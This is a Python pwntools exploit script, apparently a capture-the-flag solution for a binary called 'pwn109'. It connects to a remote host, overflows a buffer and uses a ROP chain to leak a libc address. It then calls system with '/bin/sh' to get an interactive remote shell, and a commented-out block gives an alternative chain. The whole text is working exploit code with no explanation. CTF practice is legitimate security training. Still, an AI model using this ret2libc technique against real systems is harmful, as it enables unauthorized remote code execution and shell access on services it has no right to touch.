from pwn import *

exe = './pwn109'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

libc = elf.libc

p = remote('10.10.206.177', 9009)

offset = 40
pop_rdi = 0x00000000004012a3
ret = 0x000000000040101a

payload = flat({
	offset: [
		pop_rdi,
		elf.got['puts'],
		elf.plt['puts'],
		elf.symbols['main'],
	]
})

p.recvuntil('Go ahead')
p.recvline()
p.sendline(payload)

got_puts = u64(p.recv(6) + b'\x00\x00')
# info("Puts leaked address %#x", got_puts)

libc.address = got_puts - libc.symbols['puts']
info("Libc address %#x", libc.address)

system = libc.symbols['puts'] - 0x31550
sh = libc.symbols['puts'] + 0x13337a

payload = flat({
	offset: [
		pop_rdi, sh, ret, system
	]
})

p.sendline(payload)
p.interactive()

# rop = ROP(libc)
# sh = next(libc.search(b'/bin/sh'))
# system = rop.system(sh)
# chain = rop.chain()
# 
# info("Libc system address %#x", libc.symbols['system'])
# info("Libc /bin/sh address %#x", sh)
# 
# payload = flat({
	# offset: [
		# ret, chain
	# ]
# })
# 
# p.sendline(payload)
# p.interactive()
